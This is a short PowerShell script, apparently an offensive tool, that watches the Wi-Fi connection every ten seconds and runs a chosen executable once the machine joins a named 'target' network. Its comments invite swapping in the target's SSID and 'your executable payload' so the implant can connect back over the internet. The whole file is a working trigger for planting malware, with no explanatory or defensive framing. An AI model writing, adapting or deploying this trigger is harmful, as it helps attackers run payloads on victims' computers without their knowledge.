<# Please feel free to replace the SSID with the target's and the cmd.exe with your executable payload #>
<# This payload will execute once when connected to the target network. The idea is that you can attach your payload here to connect back through the public internet. #>
$desiredNetwork = "targetSSID"
$executablePath = "cmd.exe"

while ($true) {
    $connectedNetwork = Get-NetConnectionProfile | Where-Object { $_.InterfaceAlias -like "*Wi-Fi*" }

    if ($connectedNetwork -and $connectedNetwork.Name -eq $desiredNetwork) {
        Start-Process -FilePath $executablePath
        break  
    }

    Start-Sleep -Seconds 10  
}